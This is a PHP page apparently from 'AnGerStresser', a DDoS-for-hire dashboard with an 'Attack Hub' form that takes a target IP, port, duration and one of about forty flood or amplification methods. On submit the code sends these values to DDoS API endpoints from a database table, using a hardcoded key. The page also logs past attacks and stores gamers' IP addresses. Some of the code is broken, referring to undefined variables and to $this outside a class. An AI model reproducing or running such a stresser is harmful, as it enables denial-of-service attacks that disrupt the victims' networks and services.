<?php
    session_start();
    ob_start();
    include "php/user.php";
    $con = new database;
    $user = new user;
    $con->connect();
    $userid = $_SESSION['id'];
    $user->initChecks();

    if($_GET['id'] != null)
    {
       $query1 = $con->db->prepare("SELECT * FROM `ALLHISTORY` WHERE `ID` = :license");
       $query1->execute(array("license"=>$_GET['id']));
       $result2 = $query1->fetch(PDO::FETCH_ASSOC);
        if($result2)
        {
            if($result2['userid'] == $_SESSION['id'])
            {
              $query = $con->db->prepare("DELETE FROM `ALLHISTORY` WHERE `ID` = :license");
              $query->execute(array("license"=>$_GET['id']));
              header('Location: logger.php');
            }
        }
        else
        {
            if($_GET['id'] == "all")
            {
              $query2 = $con->db->prepare("DELETE FROM `ALLHISTORY` WHERE `userid` = :license");
              $query2->execute(array("license"=>$_SESSION['id']));
              header('Location: logger.php');
            }
        }
    }
?>
<!DOCTYPE html>
<html lang="en">

<head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

        <title>AnGerNetwork - Dash</title>

        <link rel="shortcut icon" href="assets/img/favicon.ico" type="image/x-icon" />
        <!-- Vendors -->
        <link href="assets/vendors/animate.css/animate.min.css" rel="stylesheet">
        <link href="assets/vendors/zwicon/zwicon.min.css" rel="stylesheet">
        <link href="assets/vendors/overlay-scrollbars/OverlayScrollbars.min.css" rel="stylesheet">
        <link href="assets/vendors/fullcalendar/core/main.min.css" rel="stylesheet">
        <link href="assets/vendors/fullcalendar/daygrid/main.min.css" rel="stylesheet">
        <link href="assets/css/app.min.css" rel="stylesheet">
    </head>
<style> 
.toast{
    background: #861bc4;
} 
    ::-webkit-scrollbar { width: 8px; }
    ::-webkit-scrollbar-track { background: #2e343a; }
    ::-webkit-scrollbar-thumb { background: #f74d48; }
    ::-webkit-scrollbar-thumb:hover { background: #f74d48; }               
</style>
    <body>
        <div>
            <div>
                <i></i>
                <i></i>
                <i></i>
                <i></i>
                <i></i>
                <i></i>
            </div>
        </div>

        <header class="header">
            <div class="header__main">
                <i class="navigation-toggle zwicon-hamburger-menu d-xl-none"></i>

                <div class="logo d-none d-md-block">
                    <a href="index.php">
                        AnGerNetwork
                        <small>AnGerStresser</small>
                    </a>
                </div>

              

                <ul class="top-nav">
                    <li class="d-xl-none">
                        <a class="top-nav__search" href="#"><i class="zwicon-search"></i>
                            <div class="dropdown-menu"></div></a>
                    </li>

                    <li class="d-xl-none">
                        <a data-notification="#notifications-messages" href="#"><i class="zwicon-mail"></i></a>
                    </li>

                    <li class="d-xl-none">
                        <a data-notification="#notifications-alerts" href="#"><i class="zwicon-bell"></i></a>
                    </li>

                    <li class="d-none d-sm-block d-xl-none">
                        <a data-notification="#notifications-tasks" href="#"><i class="zwicon-task"></i></a>
                    </li>
                </ul>
                <small>
                ( <?php if($user->getFromTable_MyId("admin", "users") == "3") 
                { echo "Founder"; }if($user->getFromTable_MyId("admin", "users") == "2") 
                { echo "Moderator"; }if($user->getFromTable_MyId("admin", "users") == "1") 
                { echo "Administrator"; }if ($user->getFromTable_MyId("admin", "users") == "0") { echo "Member"; }?> )</small>
                <div class="user dropdown">
                    <a data-toggle="dropdown" class="d-block" href="#">
                        <img class="user__img" src="<?php echo $user->getFromTable_MyId("pic", "users"); ?>" alt="">
                    </a>
                    <div class="dropdown-menu dropdown-menu-right">
                        <div class="dropdown-header"><?php echo $user->getFromTable_MyId("username", "users"); ?></div>
                        <a class="dropdown-item" href="profile-about.html"><i class="zmdi zmdi-account"></i> View Profile</a>
                        <a class="dropdown-item" href="#"><i class="zmdi zmdi-settings"></i> Settings</a>
                        <a class="dropdown-item" href="sign_out.php"><i class="zmdi zmdi-time-restore"></i> Logout</a>
                    </div>
                </div>
            </div>

            <div class="toggles d-none d-xl-block">
                <a href="#" data-toggle="dropdown" data-notification="#notifications-messages" class="toggles__notify"><i class="zwicon-mail"></i>
                    <div class="dropdown-menu dropdown-menu-left" style="z-index: 2; position: absolute;">
                        <a class="dropdown-item" href="profile.php"><i class="zmdi zmdi-account"></i> View Profile</a>
                        <a class="dropdown-item" href="#"><i class="zmdi zmdi-settings"></i> Settings</a>
                        <a class="dropdown-item" href="sign_out.php"><i class="zmdi zmdi-time-restore"></i> Logout</a>
                    </div>
                </a>
                <a href="#" data-toggle="dropdown" ddata-notification="#notifications-alerts"><i class="zwicon-bell"></i>
                <div class="dropdown-menu dropdown-menu-right" style="z-index: 1000;">
                        <a class="dropdown-item" href="profile.php"><i class="zmdi zmdi-account"></i> View Profile</a>
                        <a class="dropdown-item" href="#"><i class="zmdi zmdi-settings"></i> Settings</a>
                        <a class="dropdown-item" href="sign_out.php"><i class="zmdi zmdi-time-restore"></i> Logout</a>
                    </div></a>
                <a href="#" data-toggle="dropdown" ddata-notification="#notifications-tasks"><i class="zwicon-task"></i>
                <div class="dropdown-menu dropdown-menu-right" style="z-index: 1000;">
                        <a class="dropdown-item" href="profile.php"><i class="zmdi zmdi-account"></i> View Profile</a>
                        <a class="dropdown-item" href="#"><i class="zmdi zmdi-settings"></i> Settings</a>
                        <a class="dropdown-item" href="sign_out.php"><i class="zmdi zmdi-time-restore"></i> Logout</a>
                    </div></a>
            </div>

        </header>
            <div class="main">
                <div class="sidebar navigation">
                    <div class="scrollbar">
                        <ul class="navigation__menu" >
                        <!--Side Bar Begin-->
                        <?php echo $user->Navigation(); ?>
                        <!--Side Bar End-->
                    </ul>
                </div>
            </div>

            <section class="content">
                <header class="content__title">
                    <h1>Attack Hub<small></small></h1>
                </header>
            <div class="alert alert-danger">AnGerStresser is currently disabled due to server issues</div>
            <div class="row"> 
                <div class="col-md-4">
                      <?php
                        if (isset($_POST['addToSafe']))
                         {
                         if (!empty($_POST['safeip']) || !empty($_POST['nameip']) || !empty($_POST['typeip']) || !empty($_POST['consip']))
                         {                 
                        $safeip = $_POST['safeip'];
                        $nameip = $_POST['nameip'];
                        $typeip = $_POST['typeip'];
                        $consip = $_POST['consip'];
                        if (filter_var($safeip, FILTER_VALIDATE_IP))
                        {   
                             $query1 = $con->db->prepare("INSERT INTO `PSNIPHISTORY` (`userid`,`name`,`ip`,`game`,`console`) VALUES (:userid, :name, :ip, :game, :console)");
                             $query1->execute(array('userid'=>$_SESSION['id'],'name'=> $nameip,'ip'=> $safeip,'game'=> $typeip,'console'=>$consip));
                             
                             $query = $con->db->prepare("INSERT INTO `ALLHISTORY` (`userid`,`name`,`ip`,`game`,`console`) VALUES (:userid, :name, :ip, :game, :console)");
                             $query->execute(array('userid'=>$_SESSION['id'],'name'=> $nameip,'ip'=> $safeip,'game'=> $typeip,'console'=>$consip));
                             echo '<div class="alert alert-success"><p>Added to Logger u can anytime resolve it!</p></div>';
                            }
                            else
                                {
                                echo '<div class="alert alert-danger"><p>Invalid IP address</p></div>';
                                    }
                                        }
                                        else
                                        {
                                            echo '<div class="alert alert-danger"><p>Please fill in all fields</p></div>';
                                        }
                                    }
                                if (isset($_POST['deleteFromSafe']))
                                {
                                $deletes = $_POST['id'];
                                if (!empty($deletes))
                                {
                                 $query = $con->db->prepare("DELETE FROM `ALLHISTORY` WHERE `ID` = :id AND `userid` = :uid LIMIT 1");
                                 $query->execute(array('id' => $deletes, 'uid' => $_SESSION['ID']));
                                 echo '<div class="alert alert-success"><p>Removed from Logger</p></div>';
                                }
                            }  
                        ?>  
                    <div class="card">
                    <div class="card-body">
                            <h4 class="card-title">Attack</h4>
                            <h6 class="card-subtitle"></h6>
                            <form  method="POST">  
                                <?php 
                                    if(isset($_POST['attackbtn']))
                                    {
                                        $sql = $this->db->prepare("SELECT * FROM `ddos_api`");
                                        $sql->execute();
                                        while($r = $sql->fetch()){
                                            $url = $r["url"]."key=dfglwekmtwelknf2359834u6&host={$host}&port={$port}&time={$time}&method={$method}";
                                            $ch = curl_init();
                                            curl_setopt($ch, CURLOPT_URL, $url);
                                            curl_setopt($ch, CURLOPT_HEADER, 0);
                                            curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                            curl_setopt($ch, CURLOPT_TIMEOUT, 1);
                                            curl_exec($ch);
                                            curl_close($ch);
                                        }
                                    }
                                ?>
                                <div class="form-group"> 
                                        <input class="form-control text-center"name="ipfrom" value="" type="text" placeholder="IP Address" />
                                        </div>
                                        <div class="form-group">
                                        <input class="form-control text-center"name="portform" value="" type="text" placeholder="Port" />
                                        </div>
                                        <div class="form-group">
                                        <input class="form-control text-center"name="timeform" value="" type="text" placeholder="Time" />
                                        </div>
                                      <div class="form-group">
                                        <div class="controls"><dt class="text-white">Methods:</dt>
                                        <br>
                                         <select  required id="typeip" class="btn btn-theme btn-block grey dropdown-toggle" name="typeip">
                                            <option value="ACK" selected="selected" />ACK
                                            <option value="ARME" selected="selected" />ARME
                                            <option value="CHARGEN" selected="selected" />CHARGEN
                                            <option value="DB2AMP" selected="selected" />DB2AMP
                                            <option value="DDNS" selected="selected" />DDNS
                                            <option value="DOMINATE" selected="selected" />DOMINATE
                                            <option value="ESSYN" selected="selected" />ESSYN
                                            <option value="ESSYN-ACK" selected="selected" />ESSYN-ACK
                                            <option value="GHP" selected="selected" />GHP
                                            <option value="HEARTBLEED" selected="selected" />HEARTBLEED
                                            <option value="IMPROVED SSYN" selected="selected" />IMPROVED SSYN
                                            <option value="LAYER-4" selected="selected" />LAYER 4
                                            <option value="GHOSTEXT" selected="selected" />GHOST-TEXT
                                            <option value="LAYER-7" selected="selected" />LAYER 7
                                            <option value="MDNS" selected="selected" />MDNS
                                            <option value="BFH" selected="selected" />BFH
                                            <option value="NETBIOS" selected="selected" />NETBIOS
                                            <option value="NTP" selected="selected" />NTP
                                            <option value="OVH" selected="selected" />OVH
                                            <option value="QUAKE-3" selected="selected" />QUAKE 3
                                            <option value="RUDY" selected="selected" />RUDY
                                            <option value="SACK" selected="selected" />SACK
                                            <option value="SENTINEL" selected="selected" />SENTINEL
                                            <option value="SLOWLORIS" selected="selected" />SLOWLORIS
                                            <option value="SNMP" selected="selected" />SNMP
                                            <option value="SPOOFED-TELNET" selected="selected" />SPOOFED TELNET
                                            <option value="SSDP" selected="selected" />SSDP
                                            <option value="SSYN-WITH-FIN" selected="selected" />SSYN WITH FIN
                                            <option value="STCP" selected="selected" />STCP
                                            <option value="STD" selected="selected" />STD
                                            <option value="SUDP" selected="selected" />SUDP
                                            <option value="SYN" selected="selected" />SYN
                                            <option value="TCP" selected="selected" />TCP
                                            <option value="TRIGMINI" selected="selected" />TRIGMINI
                                            <option value="TS3" selected="selected" />TS3
                                            <option value="UDP" selected="selected" />UDP
                                            <option value="VSE" selected="selected" />VSE
                                            <option value="WIZARD" selected="selected" />WIZARD
                                            <option value="XACK" selected="selected" />XACK
                                            <option value="XMLRPC" selected="selected" />XMLRPC
                                            <option value="XSYN" selected="selected" />XSYN
                                            <option value="ZAP" selected="selected" />ZAP
                                        </select>
                                        </div>
                                        </div>
                                        <div class="form-actions">
                                        <button type="submit" name="attackbtn" class="btn btn-danger btn-block">Launch Attack</button>
                                    </form>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-8">
                     
                    <div class="card">
                    <div class="card-body">
                        <h4 class="card-title">Last Attacks</h4>
                        <h6 class="card-subtitle"></h6>

                        <div class="table-responsive data-table">
                            <table id="data-table" class="table table-sm">
                                <thead>
                                <tr>                    
                                <th>ID</th>
                                <th>IP Address</th>
                                <th>Port</th>
                                <th>Time</th>
                                <th>Method</th>
                                <th>Date</th>
                                <th>Attack Again</th>
                                <th>Stop Attack</th>
                                </tr>
                                </thead>
                                <tbody>
                                <?php 
                                $query = $con->db->prepare("SELECT * FROM `ddos_attack_logs` WHERE userid = 1 ORDER BY `id` DESC");
                                $query->execute();
                                $res = $query->fetchAll();
                                foreach($res as $row)
                                {
                                echo '
                                <tr>    
                                <td>'.$row['id'].'</td>
                                <td>'.$row['ip'].'</td>
                                <td>'.$row['port'].'</td>
                                <td>'.$row['time'].'</td>
                                <td>'.$row['method'].'</td>
                                <td><button type="submit" name="addToSafe" class="btn btn-primary btn-block">Attack Again</button></td> 
                                <td>Stop Attack</td> 
                                ';  
                                // echo '
                                // <td>
                                // <a type="submit" class="btn btn-primary btn-block pull-right" name="deleteFromSafe" href="logger.php?id='.$row['ID'].'">Remove</a>
                                // <input type="hidden" name="id" value="'.$row['ID'].'" />     
                                // </td>
                                // </tr>
                                // ';
                                 }
                                 ?>
                                </tbody>
                                </table>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>                     
                    </div>      
                </div>
            </form>             
        </div>
    </div>
</div>
                    
<footer class="footer">Copyright &copy; 2017 & 2020 AnGerNetwork ( Protected By AnGer Protection )
    <nav class="footer__menu">
        <a  href="https://insane-dev.xyz/index.php">Home</a>
        <a  href="https://discord.gg/c9STfn7">Discord</a>
        <a  href="https://www.facebook.com/groups/370201123653676/">Facebook</a>
        <a  href="https://">VPN coming soon</a>
    </nav>
</footer>
</section>
</div>
<!-- Vendors: Data tables -->
        <script src="assets/vendors/datatables/jquery.dataTables.min.js"></script>
        <script src="assets/vendors/datatables/datatables-buttons/dataTables.buttons.min.js"></script>
        <script src="assets/vendors/datatables/datatables-buttons/buttons.print.min.js"></script>
        <script src="assets/vendors/jszip/jszip.min.js"></script>
        <script src="assets/vendors/datatables/datatables-buttons/buttons.html5.min.js"></script>

<!-- Vendors -->
        <script src="assets/vendors/jquery/jquery.min.js"></script>
        <script src="assets/vendors/popper.js/popper.min.js"></script>
        <script src="assets/vendors/bootstrap/js/bootstrap.min.js"></script>
        <script src="assets/vendors/headroom/headroom.min.js"></script>
        <script src="assets/vendors/overlay-scrollbars/jquery.overlayScrollbars.min.js"></script>
        <script src="assets/vendors/flot/jquery.flot.js"></script>
        <script src="assets/vendors/flot/jquery.flot.resize.js"></script>
        <script src="assets/vendors/flot/flot.curvedlines/curvedLines.js"></script>
        <script src="assets/vendors/sparkline/jquery.sparkline.min.js"></script>
        <script src="assets/vendors/easy-pie-chart/jquery.easypiechart.min.js"></script>
        <script src="assets/vendors/jqvmap/jquery.vmap.min.js"></script>
        <script src="assets/vendors/jqvmap/maps/jquery.vmap.world.js"></script>
        <script src="assets/vendors/fullcalendar/core/main.min.js"></script>
        <script src="assets/vendors/fullcalendar/daygrid/main.min.js"></script>
        <!-- Site Functions & Actions -->
        <script src="assets/js/app.min.js"></script>
    </body>
</html>
